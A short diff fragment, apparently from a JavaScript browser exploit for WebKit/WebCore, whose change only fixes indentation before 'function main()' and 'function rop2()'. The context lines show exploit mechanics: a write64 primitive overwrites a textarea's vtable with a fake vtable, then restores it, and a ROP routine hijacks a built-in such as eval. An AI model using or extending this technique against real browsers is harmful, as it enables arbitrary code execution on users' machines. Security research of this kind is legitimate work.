@@ -70,7 +70,7 @@ const scrollLeft_size = (() => {
     }
 })();
 
- function main() {
+function main() {
     const offset_vtable = 0;
     debug_log(`${offset_scrollLeft.toString(16)}: ${scrollLeft}`);
     webcore_textarea.write64(offset_vtable, fake_vtable_buffer);
@@ -87,7 +87,7 @@ const scrollLeft_size = (() => {
     webcore_textarea.write64(offset_vtable, original_vtable);
 }
 
- function rop2() {
+function rop2() {
     // eval() is a built-in function
     // We could use any built-in function, e.g. parseInt(), parseFloat(),
     // Date.prototype.getTime(), etc. Search for "host" functions at
